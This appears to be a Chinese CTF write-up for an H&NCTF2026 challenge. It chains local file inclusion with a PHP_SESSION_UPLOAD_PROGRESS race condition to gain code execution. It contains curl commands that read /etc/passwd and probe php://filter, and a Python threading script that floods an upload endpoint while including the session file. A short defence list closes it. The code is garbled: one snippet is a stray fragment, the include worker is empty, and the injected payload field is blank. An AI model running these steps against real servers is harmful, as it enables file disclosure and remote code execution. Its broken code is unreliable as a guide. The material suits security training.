概述

本文记录了H&NCTF2026签到题的完整解题过程。这道题考察的是LFI（本地文件包含）+ PHP_SESSION_UPLOAD_PROGRESS条件竞争攻击，最终通过RCE读取flag。

关键突破：curl -F 格式不对！换成 Python http.client 手动构造原始HTTP请求后，session文件立刻就有数据了

Flag: flag{58aefa8caa824762aa5daa0bf1787431}

漏洞发现

1. 侦察阶段

# 访问目标，发现重定向
curl http://target:14302
# => 302 重定向到 /include.php

# 扫描页面
curl -o /dev/null -w "%{http_code}" http://target/include.php
curl -o /dev/null -w "%{http_code}" http://target/upload.php
# => 都返回200

2. 发现LFI漏洞

# 测试文件包含
curl "http://target/include.php?file=/etc/passwd"
# => 成功读取！确认存在LFI

# 测试PHP文件包含
curl "http://target/include.php?file=index.php"
# => "文件不存在或不可读" — PHP文件被过滤

# 测试php://filter
curl "http://target/include.php?file=php://filter/convert.base64-encode/resource=index.php"
# => 被WAF拦截

3. 发现上传页面

# 访问upload.php，发现文件上传表单
curl http://target/upload.php
# => 有文件上传功能，包含 PHP_SESSION_UPLOAD_PROGRESS 字段

# 测试session文件路径
curl "http://target/include.php?file=/tmp/sess_测试PHPSESSID"
# => 能读取session文件，但内容为空

原理分析

什么是PHP_SESSION_UPLOAD_PROGRESS？

PHP有一个特性：当上传文件时，如果设置了PHP_SESSION_UPLOAD_PROGRESS字段，PHP会将上传进度写入session文件。

攻击原理

1. 在 PHP_SESSION_UPLOAD_PROGRESS 字段写入PHP代码
2. 上传文件时，PHP会创建session文件并写入进度数据
3. 进度数据中包含我们注入的PHP代码
4. 通过LFI包含session文件，执行注入的代码
5. 关键：要在进度数据被清理之前读取！

时间窗口

时间线：
|--上传开始--|--进度写入session--|--上传完成--|--清理session数据--|
                            ↑
                    必须在这个窗口内读取!

利用过程

第一次尝试（失败）

# 使用curl -F构造请求
curl -b "PHPSESSID=test123" \
  -X POST http://target/upload.php \
  -F "PHP_SESSION_UPLOAD_PROGRESS=" \
  -F "file=@/tmp/small.txt"

# 同时读取session文件
curl "http://target/include.php?file=/tmp/sess_test123"

# 结果：session文件始终为空 ❌

失败原因分析

curl -F 自动构造的multipart格式可能有问题，导致PHP没有正确解析PHP_SESSION_UPLOAD_PROGRESS字段。

第二次尝试（成功！）

换成Python http.client手动构造原始HTTP请求：

import threading

# 关键：手动构造multipart body

\r

--{boundary}\r
Content-Disposition: form-data; name="file"; filename="test.txt"\r

完整代码

import http.client
import threading
import time
import re

TARGET = "target"
PORT = 14302
SID = "race_condition_test"
BOUNDARY = "----WebKitFormBoundary7MA4YWxkTrZu0gW"

found = False
flag = ""

def upload_worker():
    """持续发送上传请求"""
    global found
    while not found:
        try:
            body = f"""--{BOUNDARY}\r
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r
\r
\r
--{BOUNDARY}\r
Content-Disposition: form-data; name="file"; filename="test.txt"\r
Content-Type: text/plain\r
\r
test\r
--{BOUNDARY}--\r
"""
            headers = {
                "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
                "Cookie": f"PHPSESSID={SID}"
            }
            
            conn = http.client.HTTPConnection(TARGET, PORT, timeout=5)
            conn.request("POST", "/upload.php", body=body, headers=headers)
            conn.getresponse()
            conn.close()
        except:
            pass

def include_worker():

踩坑经验

1. curl -F vs Python http.client

对比项 curl -F（失败） Python http.client（成功）
multipart格式 自动构造，可能有隐藏问题 手动构造，完全可控
Cookie传递 -b 参数 原始Cookie header
并发控制 需要外部脚本 原生threading

2. 并发比例

测试发现 8写 + 4读 的比例效果最好：

  • 写入线程多：增加session文件被写入的概率
  • 读取线程少：减少服务器压力，但足够检测到变化

3. 先验证再攻击

# 第一步：验证session.upload_progress是否开启
# 上传时检查session文件是否写入数据
# 如果始终为空，检查：
# - session.upload_progress.enabled 是否为 On
# - multipart格式是否正确
# - PHPSESSID是否有效

4. 时间管理

  • 设定时间限制（比如60秒）
  • 如果没进展，检查配置和格式
  • 记录已尝试的方法，避免重复

防御方案

  • 关闭session.upload_progress：session.upload_progress.enabled = Off
  • 过滤LFI：禁止包含/tmp/等可写目录
  • 白名单机制：只允许包含指定目录的文件
  • 禁用危险函数：disable_functions = system,exec,passthru
  • 使用open_basedir：限制PHP可访问的目录
